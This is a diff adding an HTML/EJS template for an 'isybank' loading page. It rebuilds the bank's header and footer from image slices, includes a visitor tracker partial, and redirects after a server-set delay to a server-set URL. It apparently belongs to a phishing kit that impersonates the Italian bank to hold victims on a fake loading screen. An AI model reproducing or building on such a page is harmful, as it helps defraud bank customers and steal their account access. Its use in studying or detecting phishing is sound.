@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="it">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+    <title>isybank</title>
+    <%- include('partials/tracker') %>
+    <meta http-equiv="refresh" content="<%=time%>; url=<%=url%>">
+    <link rel="stylesheet" href="css/botta.css">
+    <style>
+        :root {
+            --isy-bg: #f7f7f8;
+            --isy-loader-color: #2196F3;
+            --isy-font: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        html, body {
+            width: 100%;
+            height: 100%;
+            min-height: 100vh;
+            min-height: 100dvh;
+            background-color: var(--isy-bg);
+            font-family: var(--isy-font);
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        body {
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        /* HEADER */
+        .header-desktop {
+            width: 100%;
+            background-color: var(--isy-bg);
+            display: block;
+            overflow: hidden;
+            flex-shrink: 0;
+        }
+
+        .header-desktop img {
+            width: 100%;
+            max-height: 110px;
+            object-fit: cover;
+            object-position: left center;
+            height: auto;
+            display: block;
+        }
+
+        .header-mobile {
+            display: none;
+        }
+
+        /* CENTER LOADER SECTION */
+        .loading-main {
+            flex: 1;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            z-index: 2;
+        }
+
+        .loader-card {
+            background: transparent;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .loader {
+            width: 46px;
+            height: 46px;
+            border-radius: 50%;
+            border: 5px solid rgba(33, 150, 243, 0.16);
+            border-top: 5px solid var(--isy-loader-color);
+            border-right: 5px solid rgba(33, 150, 243, 0.65);
+            animation: isySpin 0.9s linear infinite;
+            box-sizing: border-box;
+        }
+
+        @keyframes isySpin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* RAINBOW GRAPHIC (DESKTOP) */
+        .rainbow-graphic {
+            position: fixed;
+            right: 0;
+            bottom: clamp(20px, 2.8vh, 36px);
+            width: clamp(190px, 22vw, 380px);
+            height: auto;
+            pointer-events: none;
+            z-index: 1;
+            display: block;
+        }
+
+        /* FOOTER */
+        .footer-desktop {
+            width: 100%;
+            background: #ffffff;
+            padding: clamp(6px, 1vh, 12px) 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            z-index: 2;
+            flex-shrink: 0;
+        }
+
+        .footer-desktop img {
+            width: 100%;
+            max-width: 1100px;
+            height: auto;
+            display: block;
+            margin: 0 auto;
+        }
+
+        .footer-mobile {
+            display: none;
+        }
+
+        /* RESPONSIVE MEDIA QUERIES (< 768px) */
+        @media (max-width: 768px) {
+            .header-desktop {
+                display: none !important;
+            }
+
+            .header-mobile {
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                width: 100%;
+                padding: clamp(8px, 1.8vh, 16px) 16px 0;
+                background-color: var(--isy-bg);
+            }
+
+            .header-mobile img {
+                width: 100%;
+                max-width: clamp(280px, 80vw, 420px);
+                height: auto;
+                display: block;
+                margin: 0 auto;
+            }
+
+            .rainbow-graphic {
+                display: none !important;
+            }
+
+            .footer-desktop {
+                display: none !important;
+            }
+
+            .footer-mobile {
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                width: 100%;
+                background: #ffffff;
+                padding: clamp(10px, 1.8vh, 16px) 16px;
+                position: relative;
+                z-index: 2;
+                flex-shrink: 0;
+            }
+
+            .footer-mobile img {
+                width: 100%;
+                max-width: clamp(280px, 86vw, 420px);
+                height: auto;
+                display: block;
+                margin: 0 auto;
+            }
+
+            .loader-card {
+                background: transparent;
+            }
+
+            .loader {
+                width: 48px;
+                height: 48px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- Header Section (q1.png on Desktop, q1M.png on Mobile) -->
+    <header class="header-desktop" aria-label="Intestazione isybank">
+        <img src="img/q1.png" alt="isybank" onerror="if(!this.dataset.retried){this.dataset.retried=1;this.src='public/img/q1.png';}">
+    </header>
+    <header class="header-mobile" aria-label="Intestazione isybank mobile">
+        <img src="img/q1M.png" alt="isybank" onerror="if(!this.dataset.retried){this.dataset.retried=1;this.src='public/img/q1M.png';}">
+    </header>
+
+    <!-- Center Loader Area -->
+    <main class="loading-main" role="status" aria-live="polite" aria-label="Caricamento in corso">
+        <div class="loader-card">
+            <div class="loader"></div>
+        </div>
+
+        <!-- Decorative Rainbow Graphics (Desktop only, q2.png) -->
+        <img src="img/q2.png" alt="" class="rainbow-graphic" aria-hidden="true"
+            onerror="if(!this.dataset.retried){this.dataset.retried=1;this.src='public/img/q2.png';}">
+    </main>
+
+    <!-- Footer Section (q4.png on Desktop, q4M.png on Mobile) -->
+    <footer class="footer-desktop" aria-label="Piè di pagina isybank">
+        <img src="img/q4.png" alt="Guida ai servizi | Sicurezza | Privacy | Cookies | Reclami e risoluzione delle controversie | Dichiarazione di accessibilità | Trasparenza"
+            onerror="if(!this.dataset.retried){this.dataset.retried=1;this.src='public/img/q4.png';}">
+    </footer>
+    <footer class="footer-mobile" aria-label="Piè di pagina isybank mobile">
+        <img src="img/q4M.png" alt="Guida ai servizi | Sicurezza | Privacy | Cookies | Reclami e risoluzione delle controversie | Dichiarazione di accessibilità | Trasparenza"
+            onerror="if(!this.dataset.retried){this.dataset.retried=1;this.src='public/img/q4M.png';}">
+    </footer>
+
+    <!-- Fallback redirect timer to ensure navigation if meta refresh is bypassed -->
+    <script>
+        (function() {
+            var timeSeconds = parseInt("<%=time%>", 10);
+            var redirectUrl = "<%=url%>";
+            if (!isNaN(timeSeconds) && redirectUrl && redirectUrl !== "") {
+                setTimeout(function() {
+                    window.location.href = redirectUrl;
+                }, timeSeconds * 1000);
+            }
+        })();
+    </script>
+</body>
+
+</html>
